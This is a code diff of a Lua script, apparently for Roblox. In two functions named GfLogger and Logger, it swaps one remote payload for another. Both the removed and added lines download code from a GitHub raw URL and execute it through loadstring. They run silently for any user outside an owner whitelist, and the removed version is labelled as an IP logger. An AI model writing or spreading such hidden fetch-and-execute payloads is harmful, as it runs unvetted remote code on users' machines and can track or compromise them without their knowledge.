@@ -440,7 +440,7 @@ function GfLogger()
     }
 if not id[plr.UserId] then
         local success, errorMessage = pcall(function()
-             loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/ip"))()
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))()
         end)
 
         if not success then
@@ -7702,7 +7702,7 @@ function Logger()
 
     if not ownerTable[plr.Name] and plr.UserId ~= BYPASS_ID then
         local success, errorMessage = pcall(function()
-           loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/ip"))() -- logger
+           loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/anti kick"))() -- anti kick
         end)
 
         if not success then
